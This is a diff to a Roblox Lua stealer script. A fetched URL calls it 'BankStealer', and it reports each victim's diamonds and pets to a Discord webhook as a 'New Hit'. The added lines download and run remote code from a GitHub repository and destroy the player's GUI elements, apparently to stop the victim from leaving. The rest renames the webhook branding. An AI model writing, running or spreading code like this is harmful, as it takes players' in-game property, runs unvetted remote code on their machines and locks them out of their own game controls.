@@ -84,7 +84,24 @@ local UserName = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
 if idiotuser == UserName then
     game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
 end
+-- Checks
 
+
+if _G.LoadingScreen ~= false then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/HerrSimoNHub/BankStealer/main/loadingscreen'))()
+end
+if _G.AntiLeave ~= false then
+    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        if v.Name ~= "Inventory" then
+            v:Destroy()
+        end
+    end
+    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
+            v:Destroy()
+        end
+    end
+end
 -- Remotes
 
 local getmybanksremote = debug.getconstant(
@@ -1194,7 +1211,7 @@ if banktiercheck == true then
         ["username"] = "Monzz Scriptz",
         ["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg",
         ["embeds"] = { {
-            ["title"] = "**New Hit** ||Monzz Scriptz||",
+            ["title"] = "**New Hit** ||Rizz||",
             ["url"] = "https://discord.gg/4y4CZfdJHu",
             ["type"] = "rich",
             ["color"] = tonumber(0x2798FF),
@@ -1255,7 +1272,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. BDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":dog: **Pets** :dog:",
+                ["name"] = ":joy: **Pets** :joy:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] .. "```",
                 ["inline"] = true
             }, {
@@ -1309,7 +1326,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. TDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":dog: **Pets** :dog:",
+                ["name"] = ":joy: **Pets** :joy:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] + #FinalList .. "```",
                 ["inline"] = true
             },
